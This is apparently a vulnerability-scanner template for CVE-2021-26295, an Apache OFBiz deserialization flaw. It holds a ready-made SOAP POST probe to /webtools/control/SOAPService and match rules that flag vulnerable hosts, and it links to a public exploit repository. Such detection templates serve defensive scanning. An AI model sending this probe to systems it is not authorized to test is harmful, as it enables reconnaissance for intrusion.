cve/apace-ofbiz-cve-2021-26295-unserialize.yml

name: poc-yaml-apace-ofbiz-cve-2021-26295-unserialize
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /webtools/control/SOAPService
            headers:
                Content-Type: application/xml
            body: <?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><test:clearAllEntityCaches xmlns:test="http://ofbiz.apache.org/service/"><test:cus-obj><map-Value><std-String value="http://example.com"></std-String></map-Value></test:cus-obj></test:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>
            follow_redirects: false
        expression: response.status == 200 && response.headers["Set-Cookie"].contains("OFBiz.Visitor=") && response.body.bcontains(b"errorMessage") && response.body.bcontains(b"deserializing")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://github.com/S0por/CVE-2021-26295-Apache-OFBiz-EXP
